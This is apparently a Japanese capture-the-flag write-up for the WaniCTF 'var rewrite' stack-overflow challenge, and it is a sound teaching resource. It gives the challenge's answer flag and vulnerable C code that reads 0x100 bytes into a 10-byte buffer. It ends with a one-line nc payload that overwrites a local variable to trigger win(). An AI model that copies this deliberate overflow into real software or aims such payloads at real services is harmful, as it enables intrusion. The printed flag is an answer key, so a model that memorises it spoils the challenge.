# var rewrite [pwn]

## 問題文

```
nc var.wanictf.org 9002
```
+ stackの仕組みを理解する必要があります。
+ ローカル変数はstackに積まれます。
+ ローカル変数を書き換えて下さい。

### 使用ツール例
+ [netcat (nc)](https://github.com/wani-hackase/memo-setup-pwn-utils#netcat)

### セキュリティ保護
+ *Partial RELocation ReadOnly (RELRO)*
+ *Smash Stack Protection (SSP)無効*
+ No eXecute bit(NX)有効
+ *Position Independent Executable (PIE)無効*


## FLAG
```
FLAG{1ets-1earn-stack-w1th-b0f-var1ab1e-rewr1te}
```
## 解法

脆弱性がある部分は関数vulnの中の下の部分です。

```
    char target[] = "HACKASE";
    char name[10];
    char *p;
    int ret;

    printf("What's your name?: ");
    ret = read(0, name, 0x100);
    name[ret - 1] = 0;

    write(0, str_head, strlen(str_head));
    write(0, name, strlen(name));
    write(0, str_tail, strlen(str_tail));

    if (strncmp(target, "WANI", 4) == 0)
    {
        win();
    }
    else
    {
        printf("target = %s\n", target);
    }
```

サイズが10のnameが0x100バイト書き込めてしまうのでそれを使ってtargetを書き換えます。
そして最初`HAKASE`と書かれていたメモリ領域に`WANI`を書き込むことができればwin関数が実行されます。
例えばnameにAAAAAAAAAAWANIを設定するとtargetがWANIに書き変わります。

```
% (echo "AAAAAAAAAAWANI"; cat) | nc var.wanictf.org 9002
cat FLAG.txt
```


